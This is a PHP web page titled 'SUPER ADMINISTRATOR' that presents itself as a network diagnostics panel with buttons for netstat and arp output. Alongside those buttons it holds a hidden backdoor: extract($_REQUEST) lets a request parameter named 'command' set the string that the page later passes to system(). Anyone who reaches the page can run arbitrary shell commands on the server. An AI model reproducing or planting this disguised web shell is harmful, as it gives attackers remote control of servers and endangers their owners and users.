
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>SUPER ADMINISTRATOR</title>
    
    <link rel="stylesheet" type="text/css" href="./buyer_css/nav.css">
    <link rel="stylesheet" type="text/css" href="./buyer_css/iconfont.css">
    
    <script src="./buyer_css/hm.js"></script><script type="text/javascript" src="./buyer_css/jquery.min.js"></script>
    <script type="text/javascript" src="./buyer_css/nav.js"></script>
    
</head>
<body style=""  bgcolor=#ffffff text=#000000 link=#0000cc vlink=#551a8b alink=#ff0000 onLoad=sf() topmargin=3 marginheight=3>
<br>
<br>
<?php
	$exec=NULL;
	extract($_REQUEST, EXTR_PREFIX_ALL|EXTR_REFS,"cmd_");
	if(@$cmd_command) {@$exec=$cmd_command;}
?>

<form action="" method="post" name=f>
<input type="submit" name="net" value="Connections">
<input type="submit" name="net" value="RoutingTable">
<input type="submit" name="net" value="InterfaceTable">
<input type="submit" name="net" value="NetworkStatistics">
<input type="submit" name="net" value="ArpTable">
</form>
result:<br>
<textarea cols="90" rows="20"  readonly>

<?php
switch(@$_POST['net'])
{
    case 'Connections':
	$exec="netstat -an";
	break;
    case 'RoutingTable':
	$exec="netstat -rn";
	break;
    case 'InterfaceTable':
	$exec="netstat -i";
	break;
    case 'NetworkStatistics':
	$exec="netstat -s";
	break;
    case 'ArpTable':
	$exec="arp";
}
    if($exec) { system($exec);}
?>

</textarea>
<p>
</body>
</html>
